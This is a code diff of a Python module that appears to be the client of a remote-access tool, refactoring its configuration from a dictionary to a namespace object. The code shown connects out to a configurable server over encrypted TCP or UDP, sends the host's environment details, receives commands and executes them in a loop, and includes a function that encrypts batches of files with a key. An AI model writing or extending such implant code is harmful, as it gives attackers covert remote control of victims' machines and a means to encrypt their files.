@@ -62,6 +62,7 @@ from threading import Thread
 from functools import partial
 from contextlib import suppress
 from subprocess import run, PIPE
+from types import SimpleNamespace
 from platform import node, system
 from urllib.parse import urlparse
 from urllib.request import urlopen
@@ -99,7 +100,7 @@ from ctypes import (
 
 from ..protocols import *
 from ..tcp.utils import receiveall, sendall
-from ..encryption.rc4 import encrypt, initialization, update_key
+from ..encryption.rc4 import encrypt, decrypt, initialization, update_key
 
 c_types = {
     "bool": c_bool,
@@ -162,9 +163,7 @@ def download_file(command: str, compress: bool = False) -> bytes:
     return b85encode(compress(content) if compress else content)
 
 
-def encrypt_files(
-    key: str, *paths: str, decrypt: bool = False
-) -> None:
+def encrypt_files(key: str, *paths: str, decrypt: bool = False) -> None:
     """
     This function creates processes to encrypts multiples files.
     """
@@ -470,24 +469,23 @@ Command(
 )
 
 
-def command(data: bytes) -> bytes:
+def command(variables: SimpleNamespace, data: bytes) -> bytes:
     """
     This function receives and executes commands and sends outputs.
     """
 
-    locals().update(variables)
-
-    client = socket(socket_family, socket_protocol)
-    client.connect((server, destination_port))
-    client_ssl = context.wrap_socket(client)
+    client = socket(variables.socket_family, variables.socket_protocol)
+    client.connect((variables.server, variables.destination_port))
+    client_ssl = variables.context.wrap_socket(client)
     sendall(
         client_ssl,
-        applicative_protocol.wrap_request(rc4(data)),
+        variables.applicative_protocol.wrap_request(variables.rc4(data)),
     )
-    command = rc4(
-        applicative_protocol.parse_response(
-            receiveall(client_ssl, use_timeout)
-        ), True
+    command = variables.rc4(
+        variables.applicative_protocol.parse_response(
+            receiveall(client_ssl, variables.use_timeout)
+        ),
+        True,
     ).decode()
     for command_instance in Command.instances:
         if command.strip().startswith(command_instance.startswith):
@@ -508,19 +506,20 @@ def command(data: bytes) -> bytes:
     return data
 
 
-def send_environnement(variables: Dict[str, Union[bool, int, str, SSLContext]], all: bool = True) -> None:
+def send_environnement(
+    variables: SimpleNamespace, all: bool = True
+) -> None:
     """
     This function sends environment variables.
     """
 
     key_temp = None
     recevied = b""
-    locals().update(variables)
 
     while recevied != b"\6":
-        client = socket(socket_family, socket_protocol)
-        client.connect((server, destination_port))
-        data = rc4(
+        client = socket(variables.socket_family, variables.socket_protocol)
+        client.connect((variables.server, variables.destination_port))
+        data = variables.rc4(
             b"\1"
             + (
                 dumps(
@@ -566,24 +565,25 @@ def send_environnement(variables: Dict[str, Union[bool, int, str, SSLContext]], 
                 ).encode()
             )
         )
-        client = context.wrap_socket(client)
+        client = variables.context.wrap_socket(client)
         sendall(
             client,
-            applicative_protocol.wrap_request(data),
+            variables.applicative_protocol.wrap_request(data),
         )
-        recevied = rc4(
-            applicative_protocol.parse_response(
-                receiveall(client, use_timeout)
+        encryption_key = update_key(
+            variables.encryption_key, key_temp
+        )
+        recevied = decrypt(
+            encryption_key,
+            variables.applicative_protocol.parse_response(
+                receiveall(client, variables.use_timeout)
             ),
-            True,
         )
         client.close()
 
     if key_temp:
-        encryption_key = variables["encryption_key"] = update_key(
-            encryption_key, key_temp
-        )
-        variables["rc4"] = partial(encrypt, encryption_key)
+        variables.encryption_key = encryption_key
+        variables.rc4 = partial(encrypt, encryption_key)
 
 
 def get_args_string(namespace: Dict[str, str]) -> int:
@@ -631,16 +631,16 @@ def get_args_string(namespace: Dict[str, str]) -> int:
     return 0
 
 
-def parse_args(variables: Dict[str, str]) -> int:
+def parse_args(variables: SimpleNamespace) -> int:
     """
     This function parses, formats and types arguments.
     """
 
-    encryption_key = variables["encryption_key"] = initialization(
-        variables["encryption_key"].encode()
+    encryption_key = variables.encryption_key = initialization(
+        variables.encryption_key.encode()
     )
-    variables["rc4"] = partial(encrypt, encryption_key)
-    use_ssl = variables["use_ssl"] = variables["use_ssl"].casefold() in (
+    variables.rc4 = partial(encrypt, encryption_key)
+    use_ssl = variables.use_ssl = variables.use_ssl.casefold() in (
         "1",
         "on",
         "true",
@@ -648,7 +648,7 @@ def parse_args(variables: Dict[str, str]) -> int:
         "y",
         "t",
     )
-    use_udp = variables["use_udp"] = variables["use_udp"].casefold() in (
+    use_udp = variables.use_udp = variables.use_udp.casefold() in (
         "1",
         "on",
         "true",
@@ -656,8 +656,8 @@ def parse_args(variables: Dict[str, str]) -> int:
         "y",
         "t",
     )
-    variables["socket_protocol"] = SOCK_DGRAM if use_udp else SOCK_STREAM
-    use_ipv6 = variables["use_ipv6"] = variables["use_ipv6"].casefold() in (
+    variables.socket_protocol = SOCK_DGRAM if use_udp else SOCK_STREAM
+    use_ipv6 = variables.use_ipv6 = variables.use_ipv6.casefold() in (
         "1",
         "on",
         "true",
@@ -665,8 +665,8 @@ def parse_args(variables: Dict[str, str]) -> int:
         "y",
         "t",
     )
-    variables["socket_family"] = AF_INET6 if use_ipv6 else AF_INET
-    Command.use_thread = variables["use_thread"] = variables["use_thread"].casefold() in (
+    variables.socket_family = AF_INET6 if use_ipv6 else AF_INET
+    Command.use_thread = variables.use_thread = variables.use_thread.casefold() in (
         "1",
         "on",
         "true",
@@ -674,7 +674,7 @@ def parse_args(variables: Dict[str, str]) -> int:
         "y",
         "t",
     )
-    variables["use_timeout"] = variables["use_timeout"].casefold() in (
+    variables.use_timeout = variables.use_timeout.casefold() in (
         "1",
         "on",
         "true",
@@ -682,11 +682,9 @@ def parse_args(variables: Dict[str, str]) -> int:
         "y",
         "t",
     )
-    unverified_ssl = variables["unverified_ssl"] = variables[
-        "unverified_ssl"
-    ].casefold() in ("1", "on", "true", "yes", "y", "t")
+    unverified_ssl = variables.unverified_ssl = variables.unverified_ssl.casefold() in ("1", "on", "true", "yes", "y", "t")
 
-    protocol = variables["protocol"] = variables["protocol"].upper()
+    protocol = variables.protocol = variables.protocol.upper()
     if protocol not in protocols:
         print(
             "Protocol should be in",
@@ -697,9 +695,9 @@ def parse_args(variables: Dict[str, str]) -> int:
         )
         return 2
 
-    variables["applicative_protocol"] = globals()[protocol]
+    variables.applicative_protocol = globals()[protocol]()
 
-    destination_port = variables["destination_port"]
+    destination_port = variables.destination_port
     if not destination_port.isdigit():
         print(
             "Destination port should be a port number (0-65535) not",
@@ -708,7 +706,7 @@ def parse_args(variables: Dict[str, str]) -> int:
         )
         return 3
 
-    variables["destination_port"] = destination_port = int(destination_port)
+    variables.destination_port = destination_port = int(destination_port)
     if not 0 < destination_port < 65535:
         print(
             "Destination port should be a port number (0-65535) not",
@@ -717,7 +715,7 @@ def parse_args(variables: Dict[str, str]) -> int:
         )
         return 4
 
-    ssl_certificate_file = variables["ssl_certificate_file"]
+    ssl_certificate_file = variables.ssl_certificate_file
     if ssl_certificate_file and not isfile(ssl_certificate_file):
         print(
             "Certificate file should be a real filename not",
@@ -727,14 +725,14 @@ def parse_args(variables: Dict[str, str]) -> int:
         return 5
 
     if use_ssl and unverified_ssl:
-        variables["context"] = _create_unverified_context()
+        variables.context = _create_unverified_context()
     elif use_ssl and ssl_certificate_file:
-        variables["context"] = SSLContext(PROTOCOL_TLS_CLIENT)
+        variables.context = SSLContext(PROTOCOL_TLS_CLIENT)
         context.load_verify_locations(ssl_certificate_file)
     elif use_ssl:
-        variables["context"] = SSLContext(PROTOCOL_TLS_CLIENT)
+        variables.context = SSLContext(PROTOCOL_TLS_CLIENT)
     else:
-        variables["context"] = None
+        variables.context = None
 
     return 0
 
@@ -749,22 +747,21 @@ def main() -> int:
     if code:
         return code
 
+    variables = SimpleNamespace(**variables)
     code = parse_args(variables)
     if code:
         return code
 
-    locals().update(variables)
-
     data = b" "
     while True:
-        with suppress(Exception):
-            send_environnement()
-            while True:
-                try:
-                    data = command(data)
-                except Exception as e:
-                    data = f"{e.__class__.__name__}: {e}".encode()
-                    raise e
+        # with suppress(Exception):
+        send_environnement(variables)
+        while True:
+            try:
+                data = command(variables, data)
+            except Exception as e:
+                data = f"{e.__class__.__name__}: {e}".encode()
+                raise e
 
 
 if __name__ == "__main__":
